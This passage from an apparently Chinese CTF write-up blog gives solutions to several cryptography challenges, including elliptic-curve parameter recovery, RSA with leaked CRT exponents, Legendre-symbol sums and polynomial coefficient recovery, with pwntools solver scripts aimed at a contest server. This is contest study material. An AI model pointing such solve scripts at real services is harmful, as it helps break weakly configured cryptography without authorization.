class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> sage.matrix.matrix2 <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix.determinant(f1.sylvester_matrix(f2, var))</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="built_in">int</span>(<span class="number">8763</span>))</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Luck!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line">    (x1,y1),(x2,y2),(x3,y3),(x4,y4) = <span class="built_in">eval</span>(r.recvline().replace(<span class="string">b&#x27;) (&#x27;</span>, <span class="string">b&#x27;), (&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b,p,k1,k2,k3,k4&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = (y1^<span class="number">2</span>+k1*p)-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = (y2^<span class="number">2</span>+k2*p)-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    f3 = (y3^<span class="number">2</span>+k3*p)-(x3^<span class="number">3</span>+a*x3+b)</span><br><span class="line">    f4 = (y4^<span class="number">2</span>+k4*p)-(x4^<span class="number">3</span>+a*x4+b)</span><br><span class="line">    g1 = resultant(f1, f2, b)</span><br><span class="line">    g2 = resultant(f2, f3, b)</span><br><span class="line">    g3 = resultant(f3, f4, b)</span><br><span class="line">    h1 = resultant(g1, g2, a)</span><br><span class="line">    h2 = resultant(g2, g3, a)</span><br><span class="line">    p_gcd = gcd(h1(p=<span class="number">0</span>),h2(p=<span class="number">0</span>))</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">zip</span>(*factor(p_gcd)))[<span class="number">0</span>][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    f1 = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = y2^<span class="number">2</span>-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    g = resultant(f1, f2, b)</span><br><span class="line">    a = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    b = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f2(a,b))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;me &#x27;</span>)</span><br><span class="line">    op = r.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(op)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(a).encode())</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">b&#x27;b&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(b).encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(p).encode())</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: b&#x27;SYC&#123;ECC_M4ster&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h3><blockquote><p>题目链接：nc 59.110.20.54:2613 One bullet to kill all Outlaws.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>本质是进制转换的计算方法，提供 $x$ 后给出 $\sum\limits_{i=0}^{128}p_ix^i$，求各 $p_i$。利用取余和整除计算即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">2613</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">x = <span class="number">4294967295</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;4294967295&#x27;</span>)</span><br><span class="line">c = <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">param = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">     param.append(c % x)</span><br><span class="line">     c = (c-param[-<span class="number">1</span>])//x</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(param).encode().strip(<span class="string">b&#x27;[&#x27;</span>).strip(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fi1nd-th3-x’"><a href="#Fi1nd-th3-x’" class="headerlink" title="Fi1nd_th3_x’"></a>Fi1nd_th3_x’</h3><blockquote><p>听说在那个大陆有位叫jrl777的旅行者……Cryptoer穿越到了提瓦特就要拿出真本事！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>由于 $m&lt;qr,m&lt;pr,m&lt;pq$，故 $m=c^{dP} \bmod {qr}=c^{dQ} \bmod {pr}=c^{dR} \bmod {pq}$，否则需应用CRT来求 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line">q= <span class="number">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line">r= <span class="number">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line">dP= <span class="number">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line">dQ= <span class="number">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line">dR= <span class="number">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line">c= <span class="number">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dP,q*r)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dQ,p*r)</span><br><span class="line">m3=<span class="built_in">pow</span>(c,dR,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Quick-Robert"><a href="#Quick-Robert" class="headerlink" title="Quick_Robert"></a>Quick_Robert</h3><blockquote><p>题目链接：nc 59.110.20.54:3042 <a href="https://en.wikipedia.org/wiki/Quadratic_residue">https://en.wikipedia.org/wiki/Quadratic_residue</a></p></blockquote><p>参考 <a href="https://imomath.com/index.cgi?page=quadraticCongruencesSumsLegendreSymbols">Some sums of Legendre’s symbols</a>，利用二次剩余的求和特性计算：</p><p>$\sum\limits_{x=0}^{p-1}\left(\cfrac{ax^2+bx+c}p\right) = \left\{\begin{array}{cl}-\left(\cfrac ap\right),&amp; p \nmid b^2-4ac \newline (p-1)\left(\cfrac ap\right),<br>&amp; p \mid b^2-4ac \end{array}\right.$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">3042</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;|||||\n\n&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    b = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="built_in">exec</span>(r.recvuntil(<span class="string">b&#x27;(&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    delta = b**<span class="number">2</span>-<span class="number">4</span>*a</span><br><span class="line">    x = sympy.legendre_symbol(a,p)</span><br><span class="line">    x = x*(p-<span class="number">1</span> <span class="keyword">if</span> delta%p==<span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;x = <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;answer: &#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Discrete_logarithm">https://en.wikipedia.org/wiki/Discrete_logarithm</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span 